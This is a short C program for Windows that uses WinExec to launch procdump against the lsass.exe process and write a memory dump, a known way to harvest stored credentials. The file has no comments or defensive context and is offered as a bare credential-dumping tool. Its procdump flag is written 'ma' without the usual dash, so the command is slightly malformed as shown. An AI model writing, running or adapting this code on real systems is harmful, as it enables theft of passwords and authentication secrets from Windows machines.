#include <windows.h>

#define RUN(toRun) WinExec(toRun, SW_SHOW);

int main() {
    RUN("procdump ma lsass.exe lsassdump");
    return 0;
}